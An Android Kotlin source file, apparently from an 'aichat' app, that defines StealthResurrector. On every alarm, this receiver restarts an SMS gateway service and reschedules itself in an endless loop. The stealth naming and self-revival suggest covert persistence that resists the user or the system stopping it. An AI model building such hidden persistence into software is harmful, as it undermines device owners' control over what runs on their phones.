package com.cornspace.aichat.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.cornspace.aichat.data.local.SettingsDataStore
import com.cornspace.aichat.util.AppLogger
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.flow.first
import javax.inject.Inject

/**
 * StealthResurrector - BroadcastReceiver that keeps the resurrection loop alive.
 *
 * Each time the alarm fires this receiver:
 *  1. Restarts SmsGatewayService if it isn't already running.
 *  2. Schedules the next alarm via StealthCore.scheduleNextAlarm().
 *
 * FIX: Previously this receiver started StealthCore as a foreground Service,
 * which crashed on Android 8+ because StealthCore never called startForeground().
 * Since StealthCore is now a plain object, the alarm scheduling is done inline
 * here — no Service start required.
 */
@AndroidEntryPoint
class StealthResurrector : BroadcastReceiver() {

    @Inject
    lateinit var settingsDataStore: SettingsDataStore

    companion object {
        private const val TAG = "StealthResurrector"
    }

    override fun onReceive(context: Context, intent: Intent) {
        AppLogger.d(TAG, "Resurrection alarm fired")

        val job = kotlinx.coroutines.Job()
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob(job))
        scope.launch {
            try {
                val permissionsGranted = settingsDataStore.permissionsGranted.first()
                if (!permissionsGranted) {
                    AppLogger.d(TAG, "Permissions not yet granted — skipping service restart")
                    // Still keep the resurrection loop alive
                    StealthCore.scheduleNextAlarm(context)
                    return@launch
                }

                // Restart the gateway service if it was killed.
                if (!SmsGatewayService.isServiceRunning()) {
                    AppLogger.w(TAG, "SmsGatewayService not running — restarting")
                    val serviceIntent = Intent(context, SmsGatewayService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(serviceIntent)
                    } else {
                        context.startService(serviceIntent)
                    }
                } else {
                    AppLogger.d(TAG, "SmsGatewayService already running — no restart needed")
                }

                // Keep the chain alive by scheduling the next alarm.
                // This is the only place the loop perpetuates itself.
                StealthCore.scheduleNextAlarm(context)

            } catch (e: Exception) {
                AppLogger.e(TAG, "Error in resurrection receiver", e)
            } finally {
                job.cancel()
            }
        }
    }
}